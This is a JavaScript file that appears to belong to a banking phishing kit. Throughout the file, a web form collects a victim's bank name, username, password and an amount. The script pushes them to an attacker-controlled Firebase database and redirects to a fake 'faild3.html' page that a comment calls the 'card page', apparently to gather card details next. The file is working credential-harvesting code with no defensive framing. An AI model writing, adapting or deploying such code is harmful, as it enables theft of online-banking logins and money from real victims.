
// reference your database
var ududip007DB = firebase.database().ref("ududip007");

document.getElementById("ududip007").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

    var abank = getElementVal("abank");
    var buser = getElementVal("buser");
    var cpass = getElementVal("cpass");
    var dammount = getElementVal("dammount");
    
    

  

  saveMessages(abank, buser, cpass, dammount);

  // redirect to card page
  window.location.href = "faild3.html";
}

const saveMessages = (abank, buser, cpass, dammount) => {
  var newududip007 = ududip007DB.push();

  newududip007.set({
      Bank_name: abank,
      username: buser,
      passwords: cpass,
      ammount: dammount,
      
      
    
    
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};

